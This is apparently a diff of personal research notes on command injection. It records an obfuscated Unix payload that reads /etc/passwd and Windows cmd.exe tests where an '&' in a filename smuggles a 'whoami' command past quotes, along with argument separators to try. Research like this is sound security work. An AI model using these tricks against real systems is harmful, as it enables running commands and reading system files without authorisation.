@@ -33,10 +33,28 @@ X=$'cat\x20/etc/passwd'&&$X
 	- win: the windows argument injection pattern /c "command" I "figured out" after reading the recently released reference
 	- win: additional argument separators for windows: ;-_,=/ (find out compatible commands, as echo/type are fine, while ping fails)
 	- win: check that obfuscation trick from Daniel's presentation (and prolly do more research on the subject)
+	
 	- win: 
 	C:\Users\win>echo aaa > 'test&whoami'
 'whoami'' is not recognized as an internal or external command,
 operable program or batch file.
 WHAT?!?!?!! :DDD
+Apparently in cmd.exe & used in filenames has priority over quotes:
 
+C:\Users\win\Desktop\testy>type HELLO  > 'test&whoami'
+The system cannot find the file specified.
+'whoami'' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\win\Desktop\testy>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0CD5-6659
+
+ Directory of C:\Users\win\Desktop\testy
+
+06/17/2018  12:35 AM    <DIR>          .
+06/17/2018  12:35 AM    <DIR>          ..
+06/17/2018  12:35 AM                 0 'test
+               1 File(s)              0 bytes
+               2 Dir(s)   6,749,995,008 bytes free
 
